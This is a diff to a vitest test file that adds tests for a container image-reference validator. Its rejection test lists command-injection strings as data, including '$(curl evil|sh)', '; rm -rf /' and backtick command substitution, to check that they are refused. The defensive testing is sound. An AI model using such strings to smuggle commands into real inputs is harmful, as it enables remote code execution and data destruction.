@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { fetchRemoteDigest, normalizeDigest, parseImageRef } from "./registry";
+import { assertValidImageRef, fetchRemoteDigest, normalizeDigest, parseImageRef } from "./registry";
 import { parseUpdateSettings } from "./settings";
 
 describe("parseImageRef", () => {
@@ -32,6 +32,32 @@ describe("parseImageRef", () => {
 		expect(ref.repository).toBe("library/nginx");
 		expect(ref.tag).toBe("1.27");
 		expect(ref.canonical).toBe("docker.io/library/nginx:1.27");
+	});
+});
+
+describe("assertValidImageRef", () => {
+	it("accepts well-formed tag and digest refs and returns the canonical form", () => {
+		expect(assertValidImageRef(" ghcr.io/bablilayoub/nixploy:v0.2.0 ").canonical).toBe(
+			"ghcr.io/bablilayoub/nixploy:v0.2.0",
+		);
+		expect(assertValidImageRef(`ghcr.io/bablilayoub/nixploy@sha256:${"b".repeat(64)}`).digest).toBe(
+			`sha256:${"b".repeat(64)}`,
+		);
+		expect(assertValidImageRef("nginx").canonical).toBe("docker.io/library/nginx:latest");
+	});
+
+	it("rejects shell metacharacters, whitespace and malformed components", () => {
+		for (const bad of [
+			"ghcr.io/bablilayoub/nixploy:$(curl evil|sh)",
+			"ghcr.io/bablilayoub/nixploy:latest; rm -rf /",
+			"ghcr.io/bablilayoub/nixploy:`id`",
+			"ghcr.io/bablilayoub/nixploy:v1 extra",
+			"ghcr.io/bablilayoub/nixploy@sha256:short",
+			"ghcr.io/Bablilayoub/nixploy:latest",
+			"",
+		]) {
+			expect(() => assertValidImageRef(bad), bad).toThrow(/Invalid image reference/);
+		}
 	});
 });
 
